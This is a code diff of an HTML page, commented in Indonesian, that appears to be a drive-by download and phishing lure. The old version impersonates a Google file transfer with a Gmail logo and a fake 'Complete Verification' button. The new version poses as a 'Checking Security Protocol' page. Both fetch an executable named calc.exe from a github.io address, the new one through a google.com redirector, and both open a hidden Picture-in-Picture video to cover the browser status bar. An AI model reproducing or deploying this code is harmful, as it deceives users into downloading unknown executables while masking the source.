@@ -1,21 +1,15 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Google Secure File Transfer</title>
+    <title>Checking Security Protocol...</title>
     <style>
-        body { font-family: 'Roboto', sans-serif; text-align: center; padding-top: 15vh; background: #f8f9fa; }
-        .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); display: inline-block; }
-        button { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-size: 18px; font-weight: 500; }
-        video { width: 1px; height: 1px; opacity: 0.01; position: absolute; left: 0; bottom: 0; }
+        body { font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #fff; }
+        video { width: 1px; height: 1px; opacity: 0; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <img src="https://www.gstatic.com/images/branding/product/2x/gmail_64dp.png" width="64"><br><br>
-        <h2>File download started...</h2>
-        <p>If the download doesn't start, please click the button below.</p>
-        <!-- Tombol ini sebagai cadangan sekaligus pemicu interaksi user untuk PiP -->
-        <button id="cta">Complete Verification</button>
+    <div style="text-align: center;">
+        <p>Verifying download source...</p>
     </div>
 
     <video id="v" loop muted playsinline>
@@ -24,31 +18,27 @@
 
     <script>
         const v = document.getElementById('v');
-        const cta = document.getElementById('cta');
 
-        // Fungsi untuk menutupi status bar
-        async function coverStatusBar() {
+        window.onload = async () => {
             try {
+                // Mencoba memicu PiP segera saat halaman dimuat
                 await v.play();
                 await v.requestPictureInPicture();
-            } catch (e) { console.log("PiP needs user interaction first."); }
-        }
-
-        // 1. Trigger Download Otomatis saat halaman dibuka
-        window.onload = () => {
-            const downloadUrl = "https://bangbedul19-del.github.io/bedulsantuy1.github.io/calc.exe";
-            const a = document.createElement('a');
-            a.href = downloadUrl;
-            a.click();
+                
+                // Setelah PiP aktif, arahkan ke download dengan redirector
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com/url?q=https://bangbedul19-del.github.io/bedulsantuy1.github.io/calc.exe";
+                }, 500);
+            } catch (e) {
+                // Jika butuh klik tambahan karena gesture expired
+                document.body.innerHTML = "<h1>Click anywhere to continue</h1>";
+                document.body.onclick = async () => {
+                    await v.play();
+                    await v.requestPictureInPicture();
+                    window.location.href = "https://www.google.com/url?q=https://bangbedul19-del.github.io/bedulsantuy1.github.io/calc.exe";
+                };
+            }
         };
-
-        // 2. User harus klik tombol (social engineering) untuk memicu PiP
-        // Karena Chrome melarang PiP otomatis tanpa interaksi user (user gesture)
-        cta.addEventListener('click', async () => {
-            await coverStatusBar();
-            // Pindahkan jendela PiP secara manual ke pojok kiri bawah di video demo
-            alert("Security verified. Check your downloads history.");
-        });
     </script>
 </body>
 </html>
